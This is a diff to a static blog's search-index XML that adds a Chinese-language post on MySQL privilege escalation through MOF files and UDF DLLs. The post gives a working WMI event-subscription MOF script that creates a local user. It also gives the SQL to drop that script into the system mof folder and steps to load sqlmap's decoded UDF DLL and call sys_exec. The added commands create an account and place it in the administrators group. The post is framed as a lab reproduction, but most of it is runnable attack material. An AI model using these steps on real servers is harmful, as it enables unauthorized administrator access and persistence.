@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>mysql MOF UDF 反弹端口提权</title>
+      <link href="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/"/>
+      <url>/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/</url>
+      
+        <content type="html"><![CDATA[<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>关于MOF提取的原理其实很简单，就是利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件,每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p><p>脚本</p><pre><code>#添加admin用户#pragma namespace(“\\\\.\\root\\subscription”)instance of __EventFilter as $EventFilter{EventNamespace = “Root\\Cimv2”;Name = “filtP2”;Query = “Select * From __InstanceModificationEvent ““Where TargetInstance Isa \”Win32_LocalTime\” ““And TargetInstance.Second = 5”;QueryLanguage = “WQL”;};instance of ActiveScriptEventConsumer as $Consumer{Name = “consPCSV2”;ScriptingEngine = “JScript”;ScriptText =“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user dvsx 123456 /add\”)“;};instance of __FilterToConsumerBinding{Consumer = $Consumer;Filter = $EventFilter;};</code></pre><p>想要进一步提权的话，只需要更改一条语句</p><pre><code>net.exe localgroup administrators dvsx /add</code></pre><p>接下来需要利用mysql语句执行添加的命令</p><pre><code>select load_file(“C:\RECYCLER\1.mof”) into dumpfile “c:/windows/system32/wbem/mof/nullevt.mof”</code></pre><p>前提是已经拥有mysql的root权限</p><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>UDF，user defined function,即用户自定义函数，用户可以通过自己添加函数对mysql进行功能扩充，文件后缀为.dll</p><h3 id="udf提权原理"><a href="#udf提权原理" class="headerlink" title="udf提权原理"></a>udf提权原理</h3><p>通过添加用户自定义函数导出dll，然后在mysql中使用用户自定义函数以高权限账号执行命令，添加账号进行提权。<br>当 MySQL&lt; 5.2 版本时，将 .dll 文件导入到 c:\windows 或者c:\windows\system32 目录下。<br>当 MySQL&gt; 5.2 版本时，将 .dl l文件导入到 C:\Program Files\MySQL\lib\plugin 目录下。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>和MOF提权一样，我们需要先获得低一点的权限，这里环境是windows2003<br>查看mysql的版本</p><pre><code>select version();</code></pre><p><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/1.PNG" alt=""><br>发现是5.5.53版本，所以需要自己创建plugin文件夹来存放dll文件<br>dll文件是怎么生成的呢？可以从SQLmap那里获取，因为运行SQLmap的时候需要用到一些函数。就在<strong>sqlmap/udf/mysql/windows</strong>目录下，里面有32位和64位，注意：这里的位数是mysql的位数，并不是对方系统的位数。查看自己mysql的位数的命令</p><pre><code>show variables like &#39;%version_%&#39;;</code></pre><p><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/2.PNG" alt=""><br>发现是32位的，这一步一定不能少，直接决定之后能不能复现成功。<br>还有一个需要注意的是，sqlmap里的udf.dll是通过异或编码的，使用之前一定要记得解码，解码的工具也在sqlmap中，只要进入到相应的目录运行脚本就可以了<br><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/3.PNG" alt=""><br>然后将生成的dll文件复制到mysql的/lib/plugin目录下，执行</p><pre><code>create function cmdshell returns string soname &quot;lib_mysqludf_sys.dll&quot;;</code></pre><p>发现是会报错的，因为我们的dll文件里并没有cmdshell这个函数，所以我们要先查看dll文件里都有哪些函数，用winhex打开dll文件，发现文件末尾有一些函数<br><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/4.PNG" alt=""><br>我们使用sys_exec函数</p><pre><code>create function sys_exec returns string soname &quot;lib_mysqludf_sys.dll&quot;</code></pre><p><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/5.PNG" alt=""><br>执行成功，我们可以实验一下，去执行这个函数</p><pre><code>select sys_exec(&quot;calc&quot;);</code></pre><p><img src="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/6.PNG" alt=""><br>成功弹出了计算器。<br><strong>添加用户并提升到管理员权限</strong></p><pre><code>select sys_exec(&quot;net user dvsx 111111 /add&quot;);select sys_exec(&quot;net localgroup administrators dvsx /add&quot;)</code></pre><h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><p><strong>sys_exec():执行系统命令，无返回值</strong><br><strong>sys_eval():也是执行系统命令，但是执行完之后会有返回值</strong></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>身份认证绕过漏洞(CVE-2012-2122)</title>
       <link href="/2019/07/15/shen-fen-ren-zheng-rao-guo-lou-dong-cve-2012-2122/"/>
       <url>/2019/07/15/shen-fen-ren-zheng-rao-guo-lou-dong-cve-2012-2122/</url>
